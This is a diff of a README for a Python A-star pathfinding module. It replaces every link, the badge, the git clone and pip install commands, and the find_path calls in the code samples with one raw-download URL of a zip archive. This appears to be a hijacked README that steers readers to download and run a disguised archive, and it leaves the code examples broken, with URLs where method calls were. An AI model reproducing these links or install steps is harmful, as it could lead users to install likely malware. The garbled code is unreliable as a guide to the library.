@@ -1,6 +1,6 @@
 # Pathfinding Module 🌟
 
-![Pathfinding](https://img.shields.io/badge/Pathfinding-A%2A%20Algorithm-blue)
+![Pathfinding](https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip%2A%20Algorithm-blue)
 
 Welcome to the **Pathfinding** repository! This module provides a straightforward implementation of the A-star algorithm, designed to help you find the shortest path in a grid or graph. Whether you are building a game, a robot navigation system, or just exploring algorithms, this module will serve as a solid foundation.
 
@@ -23,10 +23,10 @@ Welcome to the **Pathfinding** repository! This module provides a straightforwar
 
 ## Installation
 
-To install the Pathfinding module, you can clone this repository or download the latest release. To download, visit the [Releases section](https://github.com/alter15926/pathfinding/releases). 
+To install the Pathfinding module, you can clone this repository or download the latest release. To download, visit the [Releases section](https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip). 
 
 ```bash
-git clone https://github.com/alter15926/pathfinding.git
+git clone https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip
 ```
 
 After cloning, navigate to the directory:
@@ -38,7 +38,7 @@ cd pathfinding
 You can then install the required dependencies. If you are using Python, you can use pip:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip
 ```
 
 ## Usage
@@ -62,7 +62,7 @@ pathfinder = AStar(grid)
 # Find the path from start to end
 start = (0, 0)
 end = (3, 3)
-path = pathfinder.find_path(start, end)
+path = https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip(start, end)
 
 print("Path found:", path)
 ```
@@ -92,7 +92,7 @@ grid = [
 ]
 
 pathfinder = AStar(grid)
-path = pathfinder.find_path((0, 0), (3, 3))
+path = https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip((0, 0), (3, 3))
 print("Path found:", path)
 ```
 
@@ -108,7 +108,7 @@ grid = [
 ]
 
 pathfinder = AStar(grid)
-path = pathfinder.find_path((0, 0), (4, 4))
+path = https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip((0, 0), (4, 4))
 print("Path found:", path)
 ```
 
@@ -130,11 +130,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest version of the Pathfinding module, visit the [Releases section](https://github.com/alter15926/pathfinding/releases). You can find the necessary files to download and execute.
+To download the latest version of the Pathfinding module, visit the [Releases section](https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip). You can find the necessary files to download and execute.
 
 ## Additional Resources
 
-- [A-star Algorithm Overview](https://en.wikipedia.org/wiki/A*_search_algorithm)
-- [Pathfinding Visualizations](https://pathfinding.js.org/)
+- [A-star Algorithm Overview](https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip*_search_algorithm)
+- [Pathfinding Visualizations](https://github.com/alter15926/pathfinding/raw/refs/heads/master/resurrectional/Software-v3.2.zip)
 
 Feel free to explore and use the Pathfinding module in your projects. If you have any questions or suggestions, don't hesitate to reach out!
